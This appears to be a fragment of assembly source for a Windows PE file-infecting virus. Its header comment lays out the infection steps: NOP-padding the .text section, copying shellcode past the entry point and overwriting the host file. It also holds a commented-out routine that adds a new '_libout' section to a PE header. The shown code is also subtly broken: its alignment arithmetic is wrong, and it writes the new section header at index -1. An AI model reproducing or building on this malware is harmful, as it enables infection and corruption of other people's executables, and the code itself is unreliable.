[BITS 64]

section .text

;-------------------------------------------------------;
; The actual infection starts here:			
;							
; 1) Get a pointer to .text section of the file		
; 2) Pad the entire .text with nops			
; 3) Get a pointer to the EntryPoint 			
; 4) Copy this shellcode past the EntryPoint 		
; 5) Overwrite the original file with the infected one  
;-------------------------------------------------------;

; PARAMETERS
; rcx = file
; rdx

;     global _addNewSection

; _addNewSection:
;     ; Step 1: Locate the PE header
;     mov     eax, [rsi + 0x3C]        ; e_lfanew (offset to PE header)
;     add     rax, rsi                 ; rax now points to the PE header in memory
;     mov     r8, rax                  ; r8 will be used to store the PE header address for easy reference

;     ; Step 2: Get current NumberOfSections and SizeOfOptionalHeader
;     movzx   ecx, WORD [rax + 6]      ; NumberOfSections
;     inc     ecx                      ; Increment the section count
;     mov     WORD [rax + 6], cx       ; Update NumberOfSections in the PE header

;     movzx   edx, WORD [rax + 20]     ; SizeOfOptionalHeader

;     ; Step 3: Calculate the start of the Section Table
;     lea     rdx, [rax + 24 + rdx]    ; rdx = start of Section Table
;     mov     r9, rdx                  ; Store Section Table base in r9 for later use

;     ; Step 4: Locate end of current sections and align VirtualAddress and RawData offsets
;     xor     r12d, r12d               ; r12d will hold the max VirtualAddress end
;     xor     r13d, r13d               ; r13d will hold the max RawData end
;     mov     r10d, ecx                ; r10d = NumberOfSections

; _loop_sections:
;     dec     r10d                     ; Loop through sections in reverse
;     jl      _after_loop_sections     ; Exit loop if all sections are processed

;     lea     rax, [r9 + r10 * 40]    ; Calculate offset of the current section header

;     ; Calculate max VirtualAddress end
;     mov     edx, [rax + 12]          ; VirtualAddress of the section
;     add     edx, [rax + 8]           ; VirtualAddress + VirtualSize
;     cmp     edx, r12d
;     cmovg   r12d, edx                ; Update max if current end is higher

;     ; Calculate max RawData end
;     mov     edx, [rax + 20]          ; PointerToRawData of the section
;     add     edx, [rax + 16]          ; PointerToRawData + SizeOfRawData
;     cmp     edx, r13d
;     cmovg   r13d, edx                ; Update max if current end is higher

;     jmp     _loop_sections

; _after_loop_sections:

;     ; Step 5: Set up new section’s VirtualAddress, PointerToRawData, and Sizes
;     mov     eax, r12d                ; Start with max VirtualAddress
;     mov     ecx, [r8 + 32]           ; SectionAlignment
;     add     eax, ecx                 ; Align the VirtualAddress
;     and     eax, not ecx
;     mov     [r9 + r10d * 40 + 12], eax  ; Set VirtualAddress for new section

;     ; Set VirtualSize and SizeOfRawData to `r14` (new section size)
;     mov     [r9 + r10d * 40 + 8], r14d ; VirtualSize
;     mov     eax, r13d                ; Start with max RawData end
;     mov     ecx, [r8 + 36]           ; FileAlignment
;     add     eax, ecx                 ; Align the RawData
;     and     eax, not ecx
;     mov     [r9 + r10d * 40 + 20], eax  ; Set PointerToRawData for new section
;     mov     [r9 + r10d * 40 + 16], r14d ; Set SizeOfRawData

;     ; Step 6: Set Characteristics for the new section and Name
;     mov     DWORD [r9 + r10d * 40 + 36], 0x40000040  ; IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ
;     mov     QWORD [r9 + r10d * 40], 0x0074756F62696C5F ; Set name as '_libout\0'

;     ; Step 7: Update SizeOfImage in Optional Header
;     add     eax, r14d                  ; New VirtualAddress end (aligned)
;     mov     [r8 + 56], eax             ; Update OptionalHeader.SizeOfImage

;     ret
